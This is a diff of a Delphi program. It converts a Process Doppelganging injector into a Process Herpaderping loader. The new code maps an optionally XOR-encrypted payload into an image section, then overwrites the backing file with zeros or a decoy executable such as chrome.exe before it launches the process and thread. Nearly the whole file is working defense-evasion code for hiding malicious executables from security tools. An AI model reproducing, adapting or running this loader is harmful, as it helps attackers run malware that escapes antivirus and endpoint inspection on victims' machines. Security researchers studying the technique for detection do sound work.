@@ -1,11 +1,12 @@
 //this is https://github.com/3gstudent/Inject-dll-by-Process-Doppelganging
 //or https://github.com/hasherezade/process_doppelganging
 //or https://gist.github.com/hfiref0x/a9911a0b70b473281c9da5daea9a177f
+
 //also see https://github.com/jxy-s/herpaderping
 
 program NtCreateThread;
 
-uses windows,sysutils, ntdll ;
+uses windows,sysutils, ntdll in '..\ntdll.pas';
 
 var
 dummy:dword;
@@ -33,12 +34,11 @@ dummy:dword;
     hToken:HANDLE;
               bInherit:BOOL):BOOL; stdcall; external 'userenv.dll' ;
 
-   //function ImageNtHeader(Base: Pointer): PIMAGE_NT_HEADERS; stdcall; external 'dbghelp.dll';
+   function SetFilePointerEx(hFile: THandle; liDistanceToMove: Int64;
+       lpNewFilePointer: PInt64; dwMoveMethod: DWORD): BOOL;
+       stdcall; external 'kernel32.dll';
 
-   procedure log(msg:string);
-   begin
-   writeln(msg);
-   end;
+   //function ImageNtHeader(Base: Pointer): PIMAGE_NT_HEADERS; stdcall; external 'dbghelp.dll';
 
    procedure InitializeObjectAttributes(var p: TObjectAttributes; n:PUNICODE_STRING;
                                              a: ULONG; r: THandle; s: PVOID);
@@ -49,6 +49,11 @@ dummy:dword;
      p.ObjectName := n;
      p.SecurityDescriptor := s;
      p.SecurityQualityOfService := nil;
+   end;
+
+   procedure log(msg:string);
+   begin
+   writeln(msg);
    end;
 
    function xorfileV3(filein:string;var bufferOut:pointer):dword;
@@ -129,21 +134,72 @@ begin
   log('XOR OK');
 end;
 
-   procedure main(targetapp,payload:widestring;late_rollback:boolean=false);
+   procedure copy_file(source:widestring;destination:handle);
    var
-      targetHandle :thandle=thandle(-1);
+    buffer:pointer;
+   bytesread:dword=0;
+   byteswritten:dword=0;
+   infile:thandle=thandle(-1);
+   begin
+     if SetFilePointerEx(destination,0,nil,FILE_BEGIN)=false
+        then writeln('SetFilePointerEx NOK')
+        else writeln('SetFilePointerEx OK');
+     infile := CreateFilew(pwidechar(source), GENERIC_READ, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL , 0);
+     if infile=thandle(-1) then exit;
+     bytesread:=GetFileSize(infile,nil) ;
+     writeln('GetFileSize='+inttostr(bytesread));
+     if bytesread =0 then exit;
+     getmem(buffer,bytesread );
+     if readfile(infile,buffer^,bytesread,bytesread,nil)=false then writeln('readfile false');
+     writeln('bytesread='+inttostr(bytesread));
+     CloseHandle(infile);
+     //
+     if (WriteFile(destination, Buffer^, bytesread, byteswritten, nil)=false) or (byteswritten=0)
+        then writeln('writefile NOK')
+        else writeln('writefile OK');
+     freemem(buffer);
+     FlushFileBuffers(destination);
+     writeln('copy_file done');
+   end;
+
+   procedure overwrite_file(destination:handle);
+   var
+   buffer:pointer;
+   bytesread:dword=0;
+   byteswritten:dword=0;
+   total:int64=0;
+   size:int64=0;
+   begin
+     size:=GetFileSize(destination,nil) ;
+     writeln('size:'+inttostr(size));
+     if SetFilePointerEx(destination,0,nil,FILE_BEGIN)=false
+        then writeln('SetFilePointerEx NOK')
+        else writeln('SetFilePointerEx OK');
+     bytesread:=1024*1024;
+     buffer:=AllocMem (bytesread);
+     while total<size do
+     begin
+       if (WriteFile(destination, Buffer^, bytesread, byteswritten, nil)=false) or (byteswritten=0) then break;
+       inc(total,byteswritten );
+     end;
+   freemem(buffer);
+   FlushFileBuffers(destination);
+   writeln('overwrite_file done');
+   end;
+
+
+   procedure main(targetapp,payload,overwrite:widestring);
+   var
+
    hprocess :thandle=thandle(-1);
    SectionHandle:thandle=thandle(-1);
-   hTransaction:thandle=thandle(-1);
-   hTransactedFile:thandle=thandle(-1);
    Attrib:OBJECT_ATTRIBUTES;
    ClientId:CLIENT_ID;
    ScectionDataSize:TLargeInteger; //size of the payload
-    localSectionAddress :pvoid= nil;
-     localSectionOffset :LARGE_INTEGER;
-     remoteSectionAddress:pvoid = nil;
+
      RemoteThread :thandle=0;
-     outFile:thandle=thandle(-1);
+     infile:thandle=thandle(-1);
+     outfile:thandle=thandle(-1);
      buffer:pointer=nil;
      temp:array [0..$1000-1] of byte;
      bytesread:dword=0;
@@ -161,98 +217,36 @@ end;
      n:NativeUInt ;
      environment:pvoid;
    begin
-     {
-     //test local peb
-     status := NtQueryInformationProcess(GetCurrentProcess ,ProcessBasicInformation,@pbi,sizeof(PROCESS_BASIC_INFORMATION),@ReturnLength);
-     writeln('NtQueryInformationProcess:'+inttohex(status,sizeof(status)));
-     if status<>0 then exit;
-     writeln('PebBaseAddress:'+inttohex(nativeuint(pbi.PebBaseAddress),sizeof(pointer)));
-     writeln('UniqueProcessId:'+inttostr(pbi.UniqueProcessId));
+     //if fileexists(targetapp) then exit;
 
-     numberofbytesread:=0;
-     status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$10), @ImageBaseAddress, sizeof(pvoid), @numberofbytesread );
-     writeln('NtReadVirtualMemory:'+inttohex(status,sizeof(status)));
-     writeln('ImageBaseAddress:'+inttohex(ImageBaseAddress,sizeof(ImageBaseAddress)));
-
-     numberofbytesread:=0;
-     status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$20), @n, sizeof(pvoid), @numberofbytesread );
-     writeln('NtReadVirtualMemory:'+inttohex(status,sizeof(status)));
-     writeln('ProcessParameters:'+inttohex(n,sizeof(n)));
-
-     //lets read the whole PEB
-     numberofbytesread:=0;
-     getmem(peb_,sizeof(PEB));
-     status:=NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, peb_, sizeof(PEB), @numberofbytesread );
-     writeln('NtReadVirtualMemory:'+inttohex(status,sizeof(status)));
-
-     writeln('ImageBaseAddress:'+inttohex(nativeuint(peb_^.ImageBaseAddress),sizeof(n) ) );
-     writeln('ProcessParameters:'+inttohex(nativeuint(peb_^.ProcessParameters),sizeof(pointer)));
-     writeln(strpas(peb_^.ProcessParameters^.CommandLine.Buffer ) );
-
-     //lets overwrite processparameters address
-     status:=NtWriteVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$20), @n, sizeof(pvoid), @numberofbytesread );
-     writeln('NtWriteVirtualMemory:'+inttohex(status,sizeof(status)));
-
-     numberofbytesread:=0;
-     status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$20), @n, sizeof(pvoid), @numberofbytesread );
-     writeln('NtReadVirtualMemory:'+inttohex(status,sizeof(status)));
-     writeln('ProcessParameters:'+inttohex(n,sizeof(n)));
-
-
-     //
-     exit;
-     }
      //***************** lets read the payload
      writeln('****************');
      if (lowercase(ExtractFileExt (payload))<>'.xor') and (lowercase(ExtractFileExt (payload))<>'.encrypted') then
      begin
-     outFile := CreateFilew(pwidechar(payload), GENERIC_READ, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL , 0);
-     if outFile=thandle(-1) then exit;
-     bytesread:=GetFileSize(outfile,nil) ;
-     writeln('bytesread='+inttostr(bytesread));
+     infile := CreateFilew(pwidechar(payload), GENERIC_READ, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL , 0);
+     if infile=thandle(-1) then exit;
+     bytesread:=GetFileSize(infile,nil) ;
+     writeln('GetFileSize='+inttostr(bytesread));
      if bytesread =0 then exit;
      getmem(buffer,bytesread );
-     if readfile(outfile,buffer^,bytesread,bytesread,nil)=false then writeln('readfile false');
+     if readfile(infile,buffer^,bytesread,bytesread,nil)=false then writeln('readfile false');
      writeln('bytesread='+inttostr(bytesread));
-     CloseHandle(outfile);
+     CloseHandle(infile);
      ScectionDataSize  :=bytesread;
      end
      else
      ScectionDataSize:=xorfilev3(payload,buffer);
 
 
-     {
-     //if we want to hijack another process
-     InitializeObjectAttributes(Attrib ,nil,0,0,nil);
-     fillchar(clientid,sizeof(clientid),0);
-     clientid.UniqueProcess :=88748;
-     status:=NtOpenProcess(@targetHandle, {$1F0FFF}PROCESS_ALL_ACCESS, @Attrib, @clientid );
-     writeln('NtOpenProcess:'+inttohex(status,sizeof(status)));
-     if status<>0 then exit;
-     }
 
-
-     //************** lets create a transacted file
+     //************** lets create a target file
      writeln('****************');
-     InitializeObjectAttributes(Attrib ,nil,0,0,nil);
-     status := NtCreateTransaction(@hTransaction,TRANSACTION_ALL_ACCESS,@Attrib,nil,0,0,0,0,nil,nil);
-     writeln('NtCreateTransaction:'+inttohex(status,sizeof(status)));
-     if status<>0 then exit;
-
-
      writeln('targetapp:'+(targetapp));
-     //we could use DWORD size = GetTempPathW(MAX_PATH, temp_path);  GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
-     //create_always if you want to use a non existing file
-     if FileExists(targetapp)
-        then hTransactedFile:=CreateFileTransactedw(pwidechar(targetapp), GENERIC_WRITE or GENERIC_READ,0,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0,hTransaction,nil,nil)
-        else hTransactedFile:=CreateFileTransactedw(pwidechar(targetapp), GENERIC_WRITE or GENERIC_READ,0,nil,CREATE_ALWAYS ,FILE_ATTRIBUTE_NORMAL,0,hTransaction,nil,nil);
-     if hTransactedFile =thandle(-1) then
-                 begin
-                 writeln('hTransactedFile=invalid handle,'+inttostr(getlasterror));
-                 exit;
-                 end;
 
-     if WriteFile(hTransactedFile, Buffer^, ScectionDataSize, byteswritten, nil) =false then
+     outfile := CreateFilew(pwidechar(targetapp), GENERIC_READ or GENERIC_WRITE,0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL , 0);
+     if outfile=thandle(-1) then exit;
+
+     if WriteFile(outfile, Buffer^, ScectionDataSize, byteswritten, nil) =false then
                  begin
                  writeln('WriteFile failed');
                  exit;
@@ -263,51 +257,16 @@ end;
      //************* lets create a section against this transacted file
      writeln('****************');
      //in a normal life we would pass the handle to the file rather than hTransactedFile
-     status:=NtCreateSection(@SectionHandle,SECTION_ALL_ACCESS,nil,nil,PAGE_READONLY,SEC_IMAGE,hTransactedFile);
+     status:=NtCreateSection(@SectionHandle,SECTION_ALL_ACCESS,nil,nil,PAGE_READONLY,SEC_IMAGE,outfile);
      //status:=NtCreateSection(@SectionHandle, $E, nil, @ScectionDataSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nil );
      writeln('NtCreateSection:'+inttohex(status,sizeof(status)));
      if SectionHandle <=0 then exit;
      if status<>0 then exit;
+     //
+     overwrite_file(outfile);
+     if overwrite<>'' then copy_file (overwrite,outfile);
 
-     //rolling back here will make it so that ProcessImageFileName will be messed up
-     if late_rollback=false then
-     begin
-     status := NtRollbackTransaction(hTransaction, TRUE);
-     writeln('NtRollbackTransaction:'+inttohex(status,sizeof(status)));
-
-     CloseHandle(hTransactedFile);
-     hTransactedFile := INVALID_HANDLE_VALUE;
-
-     NtClose(hTransaction);
-     hTransaction := 0;
-     end;
-
-     {
-     localSectionOffset.QuadPart :=0;
-     //kind of NtWriteVirtualMemory
-     status:=NtMapViewOfSection( SectionHandle, thandle(-1), @localSectionAddress, 0, 0, @localSectionOffset, @ScectionDataSize , $2, $0, $4 );
-     writeln('NtMapViewOfSection:'+inttohex(status,sizeof(status)));
-     writeln('localSectionAddress:'+inttohex(nativeuint(localSectionAddress),sizeof(localSectionAddress)));
-     if localSectionAddress=nil then exit;
-
-     status:=NtMapViewOfSection( SectionHandle, targetHandle, @remoteSectionAddress, 0, 0, @localSectionOffset, @ScectionDataSize , $2, $0, $20 );
-     writeln('NtMapViewOfSection:'+inttohex(status,sizeof(status)));
-     writeln('remoteSectionAddress:'+inttohex(nativeuint(remoteSectionAddress),sizeof(remoteSectionAddress)));
-     if localSectionAddress=nil then exit;
-
-     CopyMemory (localSectionAddress ,buffer,ScectionDataSize  );
-     }
-
-     {
-     //readln;
-     //remoteSectionAddress OK but what about entrypoint
-     status:=NtCreateThreadEx(@RemoteThread, $1FFFFF{THREAD_ALL_ACCESS}, nil, targetHandle, remoteSectionAddress, nil, false, 0, nil, nil, nil );
-     writeln('NtCreateThreadEx:'+inttohex(status,sizeof(status)));
-     //remoteSectionAddress:E6FFC20000
-     //Exception non gérée à 0x000000E6FFC20004 dans cmd.exe : 0xC0000005 :
-     //Violation d'accès lors de l'écriture à l'emplacement 0x0000001CDFF84000.
-     }
-
+     closehandle(outfile); //not needed anymore since it is cached in the section
      //************** lets create the process from the section
      writeln('****************');
              ZeroMemory(@hprocess,sizeof(hprocess));
@@ -332,19 +291,10 @@ end;
              writeln('NtCreateProcessEx:'+inttohex(status,sizeof(status)));
              if status<>0 then exit;
              writeln('pid:'+inttostr(GetProcessID(hProcess)));
-
+     //readln;
      //
-     if late_rollback=true then
-     begin
-     status := NtRollbackTransaction(hTransaction, TRUE);
-     writeln('NtRollbackTransaction:'+inttohex(status,sizeof(status)));
+     NtClose( SectionHandle );
 
-     CloseHandle(hTransactedFile);
-     hTransactedFile := INVALID_HANDLE_VALUE;
-
-     NtClose(hTransaction);
-     hTransaction := 0;
-     end;
      //
      //        https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
      //        0xC0000024 STATUS_OBJECT_TYPE_MISMATCH
@@ -454,6 +404,8 @@ end;
       status:=RtlDestroyProcessParameters(ProcessParameters);
       writeln('RtlDestroyProcessParameters:'+inttohex(status,sizeof(status)));
       //readln;
+
+      //
       writeln('****************');
       RemoteThread := 0;
         status := NtCreateThreadEx(@RemoteThread,
@@ -471,19 +423,20 @@ end;
         writeln('RemoteThread:'+inttostr(GetThreadId(RemoteThread)));
       //
 
-     //NtClose( targetHandle );
-     NtClose( SectionHandle );
-     //NtClose( remoteSectionAddress );
-     //NtClose( localSectionAddress );
-     //NtClose( RemoteThread );
+
+
+
+
+
      //readln;
    end;
 
 begin
-  writeln('Process-Doppelganging');
-  writeln('ntcreatethreadex.exe targetapp payload');
-  if paramcount<>2 then exit;
-  main(paramstr(1),paramstr(2),false);
-
+  writeln('herpaderping');
+  writeln('ntcreatethreadex.exe targetapp payload [overwritewith]');
+  if paramcount<2 then exit;
+  if paramcount=2 then main(paramstr(1),paramstr(2),'');
+  //"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+  if paramcount=3 then main(paramstr(1),paramstr(2),paramstr(3));
 end.
 
